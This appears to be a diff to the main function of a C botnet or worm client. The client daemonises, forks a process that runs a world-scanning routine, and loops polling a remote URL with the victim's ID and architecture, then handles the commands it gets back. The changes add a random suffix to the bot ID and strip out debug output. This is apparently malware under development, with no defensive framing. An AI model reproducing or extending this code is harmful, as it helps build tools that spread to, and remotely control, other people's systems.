@@ -94,30 +94,26 @@ int main(int argc, char *argv[])
 		chdir("/");
 		signal(SIGPIPE, SIG_IGN);
 	}
-	
+	addr = inet_addr("8.8.8.8");
 	arch = ft_getarch();
 	id = ft_get_id();
-	
-	
+	char *uwu;
+	uwu = ft_itoa(rand() % 100000);
+	id = ft_strnjoin(id, "-", 1);
+	id = ft_strnjoin(id, uwu, strlen(uwu));
 	if (!fork())
 	{
 		ft_scan_world();
 		exit(0);
 	}
-
-  SSL_library_init();
-  OpenSSL_add_all_algorithms();
-  ERR_load_crypto_strings();
-
+	free(uwu);
 	request = ft_strjoin("?id=", id);
 	request = ft_strnjoinf(url_page, request, strlen(request));
 	request = ft_strnjoin(request, "&arch=", strlen(request));
 	request = ft_strnjoin(request, arch, strlen(request));
 	while (true)
 	{
-		printf("request: %s\n", request);
 		tmp = ft_request(request);
-		printf("temp_response: %s\n", tmp);
 		if (tmp)
 		{
 			ft_manage_request(tmp);
